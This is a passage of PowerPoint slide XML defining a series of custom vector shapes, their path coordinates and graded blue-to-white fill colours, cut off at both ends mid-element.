            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="19" h="92">
                <a:moveTo>
                  <a:pt x="6" y="1"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="6" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="16"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="41"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="57"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="73"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="92"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="92"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="89"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16" y="82"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="70"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="57"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="42"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="1"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="3f9eff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="642" name="CustomShape 258"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2827440" y="3414600"/>
            <a:ext cx="42120" cy="164520"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="27" h="104">
                <a:moveTo>
                  <a:pt x="27" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="26" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="25" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="22" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="20" y="19"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="32"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16" y="49"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="74"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="20" y="104"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="104"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="101"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="92"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="80"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="64"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="47"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="31"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="27" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="3f9eff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="643" name="CustomShape 259"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2671920" y="3441600"/>
            <a:ext cx="27720" cy="127800"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="18" h="81">
                <a:moveTo>
                  <a:pt x="6" y="2"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="6" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="15"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="25"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="37"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="50"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="65"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="81"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16" y="80"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16" y="78"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="72"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="61"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="50"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="37"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="24"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="2"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="59b2ff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="644" name="CustomShape 260"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2673360" y="3449520"/>
            <a:ext cx="21600" cy="108720"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="14" h="69">
                <a:moveTo>
                  <a:pt x="5" y="2"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="5" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="21"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="32"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="44"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="56"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="69"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="69"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="67"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="61"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="53"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="44"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="32"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="20"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="2"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="72c6ff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="645" name="CustomShape 261"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2674800" y="3459240"/>
            <a:ext cx="18360" cy="89640"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="12" h="57">
                <a:moveTo>
                  <a:pt x="4" y="1"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="3" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="18"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="35"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="46"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="57"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="56"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="55"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="50"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="43"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="35"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="17"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="1"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="8cd8ff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="646" name="CustomShape 262"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2674800" y="3467160"/>
            <a:ext cx="15120" cy="70560"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="10" h="45">
                <a:moveTo>
                  <a:pt x="4" y="1"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="3" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="9"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="21"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="37"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="45"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="45"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="44"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="41"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="35"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="21"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="1"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="a5edff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="647" name="CustomShape 263"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2678040" y="3476520"/>
            <a:ext cx="10440" cy="53280"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="7" h="34">
                <a:moveTo>
                  <a:pt x="2" y="1"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="1" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="15"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="21"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="34"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="34"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="32"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="29"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="25"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="21"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="15"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="1"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="bfffff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="648" name="CustomShape 264"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2828880" y="3424320"/>
            <a:ext cx="37440" cy="143640"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="24" h="91">
                <a:moveTo>
                  <a:pt x="24" y="1"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="22" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="21" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17" y="16"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="43"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="64"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="91"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="91"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="88"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="81"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="70"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="56"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="42"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="24" y="1"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="59b2ff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="649" name="CustomShape 265"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2830680" y="3435480"/>
            <a:ext cx="29520" cy="121680"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="19" h="77">
                <a:moveTo>
                  <a:pt x="19" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="19" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="23"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="36"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="54"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="77"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="77"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="75"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="69"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="60"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="48"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="35"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="22"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="72c6ff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="650" name="CustomShape 266"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2833560" y="3444840"/>
            <a:ext cx="23040" cy="100800"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="15" h="64">
                <a:moveTo>
                  <a:pt x="15" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="15" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="12"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="20"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="30"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="45"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="64"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="64"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="62"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="57"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="49"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="40"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="29"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="19"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="8cd8ff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="651" name="CustomShape 267"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2833560" y="3454560"/>
            <a:ext cx="18360" cy="80280"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="12" h="51">
                <a:moveTo>
                  <a:pt x="12" y="1"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="12" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="9"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="16"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="24"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="36"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="51"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="51"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="50"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="45"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="39"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="31"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="23"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="15"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="1"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="a5edff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="652" name="CustomShape 268"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2835360" y="3465360"/>
            <a:ext cx="13680" cy="57960"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="9" h="37">
                <a:moveTo>
                  <a:pt x="9" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="9" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="17"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="25"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="37"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="37"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="36"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="32"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="23"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="16"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="bfffff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="653" name="CustomShape 269"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2639880" y="3449520"/>
            <a:ext cx="5760" cy="186480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="000000"/>
